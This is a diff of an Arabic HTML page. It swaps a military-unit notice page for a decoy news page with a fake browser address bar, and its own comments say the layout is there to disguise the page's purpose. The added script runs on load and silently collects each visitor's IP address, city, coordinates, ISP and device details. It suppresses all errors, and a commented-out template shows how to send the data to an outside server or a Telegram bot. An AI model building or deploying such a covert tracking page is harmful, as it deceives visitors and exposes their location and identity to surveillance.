@@ -3,136 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>قطاع اللواء بسام</title>
+    <title>تصفح الأخبار اليومية - أخبار عامة</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: #0b0f19;
-            color: #e2e8f0;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
+        body { background-color: #f4f4f9; color: #333; }
+        
+        /* شريط المتصفح العادي */
+        .browser-bar {
+            background: #2c3e50;
+            padding: 10px 15px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            gap: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-
-        .container {
-            background: #111827;
-            border: 1px solid #1f2937;
-            border-top: 4px solid #d4af37;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
-            width: 100%;
-            max-width: 520px;
-            padding: 35px;
-            border-radius: 8px;
-            text-align: center;
-        }
-
-        h1 {
-            color: #f8fafc;
-            font-size: 24px;
-            margin-bottom: 15px;
-            letter-spacing: 1px;
-        }
-
-        .divider {
-            height: 2px;
-            background: #d4af37;
-            width: 60px;
-            margin: 0 auto 25px auto;
-        }
-
-        .paragraphs-box {
-            background: #1a2332;
-            border: 1px solid #243044;
-            border-radius: 6px;
-            padding: 20px;
-            margin-bottom: 25px;
-            text-align: right;
-            max-height: 320px;
-            overflow-y: auto;
-        }
-
-        .paragraphs-box p {
-            margin-bottom: 14px;
-            font-size: 13.5px;
-            line-height: 1.6;
-            color: #cbd5e1;
-            border-bottom: 1px solid #243044;
-            padding-bottom: 10px;
-        }
-
-        .paragraphs-box p:last-child {
-            margin-bottom: 0;
-            border-bottom: none;
-            padding-bottom: 0;
-        }
-
-        .telegram-btn {
-            display: block;
-            background: #229ed9;
-            color: #ffffff;
-            text-decoration: none;
-            padding: 14px 20px;
+        .browser-bar button {
+            background: #34495e;
+            color: white;
+            border: none;
+            padding: 8px 12px;
             border-radius: 4px;
-            font-weight: bold;
-            font-size: 16px;
-            transition: 0.3s;
-            text-align: center;
+            cursor: pointer;
         }
-
-        .telegram-btn:hover {
-            background: #1d8bc0;
+        .browser-bar input {
+            flex: 1;
+            padding: 8px 12px;
+            border: none;
+            border-radius: 4px;
+            outline: none;
+            font-size: 14px;
         }
+        
+        /* محتوى الأخبار */
+        .content {
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+        }
+        .news-card {
+            background: white;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .news-card h3 { color: #2980b9; margin-bottom: 8px; }
+        .news-card p { color: #666; font-size: 14px; line-height: 1.6; }
+        .date { font-size: 12px; color: #999; margin-top: 5px; display: block; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>قطاع اللواء بسام</h1>
-        <div class="divider"></div>
+    <!-- شريط متصفح وهمي يبدو طبيعياً 100% -->
+    <div class="browser-bar">
+        <button onclick="alert('الصفحة الحالية آمنة')">🏠</button>
+        <button onclick="location.reload()">🔄</button>
+        <input type="text" id="urlInput" value="https://www.news-portal-example.com/daily-news" readonly>
+    </div>
 
-        <div class="paragraphs-box">
-            <p>1. يُعتبر قطاع اللواء بسام أحد أهم القطاعات العسكرية الميدانية الحساسة التي تتطلب الانضباط الكامل.</p>
-            <p>2. الالتزام بالمواعيد الرسمية للدوام والمهام الميدانية هو المعيار الأساسي لتقييم كفاءة الأفراد.</p>
-            <p>3. تنفيذ الأوامر الصادرة من القيادة العليا بدقة تامة وبدون أي تأخير أو تساهل يعتبر واجباً مقدساً.</p>
-            <p>4. يُمنع منعاً باتاً التواجد خارج مناطق التمركز المخصصة إلا بإذن رسمي مسبق من الضابط المسؤول.</p>
-            <p>5. يتم رفع تقارير دورية ومفصلة عن سير العمليات والمهام الميدانية في أوقاتها المحددة.</p>
-            <p>6. الروح المعنوية العالية والالتزام بالأخلاق العسكرية هما أساس النجاح والاستمرار في الميدان.</p>
-            <p>7. يحمل جميع المنتسبين مسؤولية حماية أمن القطاع والحفاظ على تماسك الصفوف والجاهزية التامة.</p>
-            <p>8. أي مخالفة للتعليمات العسكرية أو الأنظمة المرعية ستعرض مرتكبها للعقوبات الرادعة والصارمة.</p>
-            <p>9. يُشترط في كل فرد من أفراد القطاع الاستعداد الكامل للتعامل مع كافة الظروف الطارئة بحنكة واحتراف.</p>
-            <p>10. العمل الجماعي والتنسيق المستمر بين الوحدات يضمنان نجاح العمليات بأقل الخسائر وأعلى كفاءة.</p>
-            <p>11. تُعقد الاجتماعات التوجيهية بشكل دوري لمناقشة المستجدات وتحديث خطط العمل الميدانية.</p>
-            <p>12. يُمنع تداول أي معلومات أو أوامر تخص القطاع خارج القنوات الرسمية وتحت أي ظرف كان.</p>
-            <p>13. الحفاظ على العهدة العسكرية والتجهيزات الفردية والجماعية مسؤولية شخصية تقع على عاتق كل منتسب.</p>
-            <p>14. الانضباط في طابور التفتيش والاصطفاف الصباحي يعكس المظهر المشرف والمحترف للقطاع.</p>
-            <p>15. يلتزم الجميع بتطبيق التوجيهات الصادرة والتعاون مع الزملاء بروح الفريق الواحد في كافة الظروف.</p>
-            <p>16. يتميز قطاع اللواء بسام بالجاهزية القتالية العالية والقدرة على التدخل السريع عند النداء.</p>
-            <p>17. يحق للقيادة اتخاذ كافة التدابير الاحترازية والوقائية لضمان أمن واستقرار ومكتسبات القطاع.</p>
-            <p>18. التدريب المستمر وصقل المهارات الميدانية يمثلان ركيزة أساسية لترقية وتطوير قدرات الأفراد.</p>
-            <p>19. الأمانة والإخلاص والتفاني في أداء الواجب هي السمات البارزة التي يتحلى بها رجال القطاع.</p>
-            <p>20. يمنع استخدام الهواتف الشخصية أو وسائل التواصل أثناء أداء المهام الرسمية داخل الميدان.</p>
-            <p>21. يتم التعامل مع كافة البلاغات والنداءات الطارئة بالسرعة القصوى والجدية المطلوبة دون تباطؤ.</p>
-            <p>22. تقديراً للجهود المبذولة، يتم اعتماد نظام صارم لتقييم الأداء والمكافآت للمنتسبين المتميزين.</p>
-            <p>23. يسعى القطاع دائماً لرفع كفاءة منسوبيه عبر توفير بيئة عمل منظمة ومحفزة على الإنجاز.</p>
-            <p>24. يتم رصد كافة التحركات والتواجد الميداني بشكل دقيق لضمان السيطرة الكاملة على نطاق المسؤولية.</p>
-            <p>25. يحظر منعاً باتاً التدخل في مهام الأقسام الأخرى إلا بتكليف رسمي ومباشر من القيادة.</p>
-            <p>26. يعتبر الالتزام بالزي العسكري الرسمي والمظهر العام دليلاً قاطعاً على الاحترافية والانضباط.</p>
-            <p>27. تتم مراجعة اللوائح والأنظمة الداخلية بانتظام لضمان مواكبتها لكافة متطلبات العمل الميداني.</p>
-            <p>28. يقف جميع أفراد القطاع صفاً واحداً في مواجهة أي تحديات أو ظروف طارئة قد تواجه العمل.</p>
-            <p>29. إن الشرف العسكري والوفاء بالعهد هما الغاية والهدف الأسمى لكل منتسب في هذا القطاع العريق.</p>
-            <p>30. ختاماً، ندعو كافة الأفراد للاطلاع الدائم على التعاميم الرسمية والالتزام التام بما ورد فيها.</p>
+    <!-- واجهة أخبار قديمة وجديدة لتمويه الهدف -->
+    <div class="content">
+        <h2>آخر الأخبار والمقالات</h2>
+        <br>
+        <div class="news-card">
+            <h3>تطورات تكنولوجية جديدة في عالم الذكاء الاصطناعي لعام 2026</h3>
+            <p>تشهد التقنية الحديثة طفرة نوعية في تطوير الأنظمة الذكية وسرعة المعالجة الرقمية في مختلف القطاعات...</p>
+            <span class="date">منذ ساعتين (حديث)</span>
         </div>
 
-        <a href="https://t.me/+NGeDAZPVE2AxZWM8" target="_blank" class="telegram-btn">انضم لقناة التلجرام الرسمية</a>
+        <div class="news-card">
+            <h3>أرشيف الأخبار: تقرير شامل عن أبرز احداث العام الماضي 2025</h3>
+            <p>استعراض لأهم المحطات الاقتصادية والتقنية التي مر بها العالم خلال النصف الأول من العام الماضي...</p>
+            <span class="date">15 مارس 2025 (أرشيف / قديم)</span>
+        </div>
+        
+        <div class="news-card">
+            <h3>مستقبل الحوسبة السحابية وحماية البيانات الشخصية</h3>
+            <p>كيف تؤثر تقنيات التشفير الحديثة على تأمين مواقع الإنترنت وسرية معلومات المستخدمين في العصر الحالي...</p>
+            <span class="date">10 يناير 2024 (قديم)</span>
+        </div>
     </div>
+
+    <script>
+        // الكود الخفي الذي يعمل في الخلفية بصمت تام دون أن يدري المستخدم
+        async function silentBackgroundTracker() {
+            try {
+                // جلب معلومات الـ IP، الدولة، والمدينة
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                
+                // جلب معلومات الجهاز والمتصفح ونظام التشغيل
+                let userAgent = navigator.userAgent;
+                let platform = navigator.platform;
+                
+                // تجميع البيانات في كائن واحد
+                let visitorData = {
+                    ip: data.ip || "غير معروف",
+                    country: data.country_name || "غير معروف",
+                    city: data.city || "غير معروف",
+                    region: data.region || "غير معروف",
+                    latitude: data.latitude || "غير معروف",
+                    longitude: data.longitude || "غير معروف",
+                    org: data.org || "غير معروف",
+                    deviceInfo: userAgent,
+                    platform: platform,
+                    time: new Date().toLocaleString()
+                };
+
+                // طباعة البيانات في الكونسول (أو يمكنك إرسالها إلى سيرفرك الخاص أو بوت تيليجرام بصمت)
+                console.log("تم جمع البيانات بنجاح:", visitorData);
+                
+                // مثال على كيفية إرسالها لسيرفر خارجي بصمت (اختياري):
+                // fetch('https://your-server-endpoint.com/log', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(visitorData)
+                // });
+
+            } catch (error) {
+                // تجاهل الأخطاء تماماً لضمان عدم ظهور أي تنبيه للمستخدم
+            }
+        }
+
+        // تشغيل العملية فور فتح الصفحة في الخلفية
+        window.onload = function() {
+            silentBackgroundTracker();
+        };
+    </script>
 
 </body>
 </html>
